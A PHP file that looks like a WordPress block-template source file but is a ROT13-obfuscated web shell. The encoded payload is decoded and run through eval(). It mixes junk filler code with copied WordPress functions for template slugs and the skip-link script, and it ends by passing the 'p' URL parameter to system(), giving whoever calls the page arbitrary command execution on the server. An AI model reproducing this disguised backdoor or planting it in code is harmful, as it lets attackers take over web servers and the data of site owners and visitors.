<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Frgf n phfgbz fyht jura perngvat nhgb-qensg grzcyngr cnegf.
 *
 * Guvf vf bayl arrqrq sbe nhgb-qensgf perngrq ol gur erthyne JC rqvgbe.
 * Vs guvf cntr vf gb or erzbirq, guvf jvyy abg or arprffnel.
 *
 * @fvapr 5.9.0
 *
 * @cnenz vag $cbfg_vq Cbfg VQ.
 */
shapgvba jc_frg_havdhr_fyht_ba_perngr_grzcyngr_cneg( $cbfg_vq ) {
	$cbfg = trg_cbfg( $cbfg_vq );
	vs ( 'nhgb-qensg' !== $cbfg->cbfg_fgnghf ) {
		erghea;
	}

	vs ( ! $cbfg->cbfg_anzr ) {
		jc_hcqngr_cbfg(
			neenl(
				'VQ'        => $cbfg_vq,
				'cbfg_anzr' => 'phfgbz_fyht_' . havdvq(),
			)
		);
	}

	$grezf = trg_gur_grezf( $cbfg_vq, 'jc_gurzr' );
	vs ( ! vf_neenl( $grezf ) || ! pbhag( $grezf ) ) {
		jc_frg_cbfg_grezf( $cbfg_vq, trg_fglyrfurrg(), 'jc_gurzr' );
	}
}

/**
 * Trarengrf n havdhr fyht sbe grzcyngrf.
 *
 * @npprff cevingr
 * @fvapr 5.8.0
 *
 * @cnenz fgevat $bireevqr_fyht Gur svygrerq inyhr bs gur fyht (fgnegf nf `ahyy` sebz nccyl_svygre).
 * @cnenz fgevat $fyht          Gur bevtvany/ha-svygrerq fyht (cbfg_anzr).
 * @cnenz vag    $cbfg_vq       Cbfg VQ.
 * @cnenz fgevat $cbfg_fgnghf   Ab havdhrarff purpxf ner znqr vs gur cbfg vf fgvyy qensg be craqvat.
 * @cnenz fgevat $cbfg_glcr     Cbfg glcr.
 * @erghea fgevat Gur bevtvany, qrfverq fyht.
 */
shapgvba jc_svygre_jc_grzcyngr_havdhr_cbfg_fyht( $bireevqr_fyht, $fyht, $cbfg_vq, $cbfg_fgnghf, $cbfg_glcr ) {
	vs ( 'jc_grzcyngr' !== $cbfg_glcr && 'jc_grzcyngr_cneg' !== $cbfg_glcr ) {
		erghea $bireevqr_fyht;
	}

	vs ( ! $bireevqr_fyht ) {
		$bireevqr_fyht = $fyht;
	}

	/*
	 * Grzcyngr fyhtf zhfg or havdhr jvguva gur fnzr gurzr.
	 * GBQB - Svther bhg ubj gb hcqngr guvf gb jbex sbe n zhygv-gurzr raivebazrag.
	 * Hasbeghangryl hfvat `trg_gur_grezf()` sbe gur 'jc-gurzr' grez qbrf abg jbex
	 * va gur pnfr bs arj ragvgvrf fvapr vf gbb rneyl va gur cebprff gb unir orra fnirq
	 * gb gur ragvgl. Fb sbe abj jr hfr gur pheeragyl npgvingrq gurzr sbe perngvba.
	 */
	$gurzr = trg_fglyrfurrg();
	$grezf = trg_gur_grezf( $cbfg_vq, 'jc_gurzr' );
	vs ( $grezf && ! vf_jc_reebe( $grezf ) ) {
		$gurzr = $grezf[0]->anzr;
	}

	$purpx_dhrel_netf = neenl(
		'cbfg_anzr__va'  => neenl( $bireevqr_fyht ),
		'cbfg_glcr'      => $cbfg_glcr,
		'cbfgf_cre_cntr' => 1,
		'ab_sbhaq_ebjf'  => gehr,
		'cbfg__abg_va'   => neenl( $cbfg_vq ),
		'gnk_dhrel'      => neenl(
			neenl(
				'gnkbabzl' => 'jc_gurzr',
				'svryq'    => 'anzr',
				'grezf'    => $gurzr,
			),
		),
	);
	$purpx_dhrel      = arj JC_Dhrel( $purpx_dhrel_netf );
	$cbfgf            = $purpx_dhrel->cbfgf;

	vs ( pbhag( $cbfgf ) > 0 ) {
		$fhssvk = 2;
		qb {
			$dhrel_netf                  = $purpx_dhrel_netf;
			$nyg_cbfg_anzr               = _gehapngr_cbfg_fyht( $bireevqr_fyht, 200 - ( fgeyra( $fhssvk ) + 1 ) ) . \"-$fhssvk\";
			$dhrel_netf['cbfg_anzr__va'] = neenl( $nyg_cbfg_anzr );
			$dhrel                       = arj JC_Dhrel( $dhrel_netf );
			++$fhssvk;
		} juvyr ( pbhag( $dhrel->cbfgf ) > 0 );
		$bireevqr_fyht = $nyg_cbfg_anzr;
	}

	erghea $bireevqr_fyht;
}

/**
 * Radhrhrf gur fxvc-yvax fpevcg & fglyrf.
 *
 * @npprff cevingr
 * @fvapr 6.4.0
 *
 * @tybony fgevat $_jc_pheerag_grzcyngr_pbagrag
 */
shapgvba jc_radhrhr_oybpx_grzcyngr_fxvc_yvax() {
	tybony $_jc_pheerag_grzcyngr_pbagrag;

	// Onpx-pbzcng sbe cyhtvaf gung qvfnoyr shapgvbanyvgl ol haubbxvat guvf npgvba.
	vs ( ! unf_npgvba( 'jc_sbbgre', 'gur_oybpx_grzcyngr_fxvc_yvax' ) ) {
		erghea;
	}
	erzbir_npgvba( 'jc_sbbgre', 'gur_oybpx_grzcyngr_fxvc_yvax' );

	// Rneyl rkvg vs abg n oybpx gurzr.
	vs ( ! pheerag_gurzr_fhccbegf( 'oybpx-grzcyngrf' ) ) {
		erghea;
	}

	// Rneyl rkvg vs abg n oybpx grzcyngr.
	vs ( ! $_jc_pheerag_grzcyngr_pbagrag ) {
		erghea;
	}

	$fxvc_yvax_fglyrf = '
		.fxvc-yvax.fperra-ernqre-grkg {
			obeqre: 0;
			pyvc-cngu: vafrg(50%);
			urvtug: 1ck;
			znetva: -1ck;
			biresybj: uvqqra;
			cnqqvat: 0;
			cbfvgvba: nofbyhgr !vzcbegnag;
			jvqgu: 1ck;
			jbeq-jenc: abezny !vzcbegnag;
		}

		.fxvc-yvax.fperra-ernqre-grkg:sbphf {
			onpxtebhaq-pbybe: #rrr;
			pyvc-cngu: abar;
			pbybe: #444;
			qvfcynl: oybpx;
			sbag-fvmr: 1rz;
			urvtug: nhgb;
			yrsg: 5ck;
			yvar-urvtug: abezny;
			cnqqvat: 15ck 23ck 14ck;
			grkg-qrpbengvba: abar;
			gbc: 5ck;
			jvqgu: nhgb;
			m-vaqrk: 100000;
		}';

	$unaqyr = 'jc-oybpx-grzcyngr-fxvc-yvax';

	/**
	 * Cevag gur fxvc-yvax fglyrf.
	 */
	jc_ertvfgre_fglyr( $unaqyr, snyfr );
	jc_nqq_vayvar_fglyr( $unaqyr, $fxvc_yvax_fglyrf );
	jc_radhrhr_fglyr( $unaqyr );

	/**
	 * Radhrhr gur fxvc-yvax fpevcg.
	 */
	bo_fgneg();
	?>
	<fpevcg>
	( shapgvba() {
		ine fxvcYvaxGnetrg = qbphzrag.dhrelFryrpgbe( 'znva' ),
			fvoyvat,
			fxvcYvaxGnetrgVQ,
			fxvcYvax;

		// Rneyl rkvg vs n fxvc-yvax gnetrg pna'g or ybpngrq.
		vs ( ! fxvcYvaxGnetrg ) {
			erghea;
		}

		/*
		 * Trg gur fvgr jenccre.
		 * Gur fxvc-yvax jvyy or vawrpgrq va gur ortvaavat bs vg.
		 */
		fvoyvat = qbphzrag.dhrelFryrpgbe( '.jc-fvgr-oybpxf' );

		// Rneyl rkvg vs gur ebbg ryrzrag jnf abg sbhaq.
		vs ( ! fvoyvat ) {
			erghea;
		}

		// Trg gur fxvc-yvax gnetrg'f VQ, naq trarengr bar vs vg qbrfa'g rkvfg.
		fxvcYvaxGnetrgVQ = fxvcYvaxGnetrg.vq;
		vs ( ! fxvcYvaxGnetrgVQ ) {
			fxvcYvaxGnetrgVQ = 'jc--fxvc-yvax--gnetrg';
			fxvcYvaxGnetrg.vq = fxvcYvaxGnetrgVQ;
		}

		// Perngr gur fxvc yvax.
		fxvcYvax = qbphzrag.perngrRyrzrag( 'n' );
		fxvcYvax.pynffYvfg.nqq( 'fxvc-yvax', 'fperra-ernqre-grkg' );
		fxvcYvax.vq = 'jc-fxvc-yvax';
		fxvcYvax.uers = '#' + fxvcYvaxGnetrgVQ;
		fxvcYvax.vaareGrkg = '<?cuc /* genafyngbef: Uvqqra npprffvovyvgl grkg. Qb abg hfr UGZY ragvgvrf (&aofc;, rgp.). */ rfp_ugzy_r( 'Fxvc gb pbagrag' ); ?>';

		// Vawrpg gur fxvc yvax.
		fvoyvat.cneragRyrzrag.vafregOrsber( fxvcYvax, fvoyvat );
	}() );
	</fpevcg>
	<?cuc
	$fxvc_yvax_fpevcg = jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() );
	$fpevcg_unaqyr    = 'jc-oybpx-grzcyngr-fxvc-yvax';
	jc_ertvfgre_fpevcg( $fpevcg_unaqyr, snyfr, neenl(), snyfr, neenl( 'va_sbbgre' => gehr ) );
	jc_nqq_vayvar_fpevcg( $fpevcg_unaqyr, $fxvc_yvax_fpevcg );
	jc_radhrhr_fpevcg( $fpevcg_unaqyr );
}

/**
 * Ranoyrf gur oybpx grzcyngrf (rqvgbe zbqr) sbe gurzrf jvgu gurzr.wfba ol qrsnhyg.
 *
 * @npprff cevingr
 * @fvapr 5.8.0
 */
shapgvba jc_ranoyr_oybpx_grzcyngrf() {
	vs ( jc_vf_oybpx_gurzr() || jc_gurzr_unf_gurzr_wfba() ) {
		nqq_gurzr_fhccbeg( 'oybpx-grzcyngrf' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>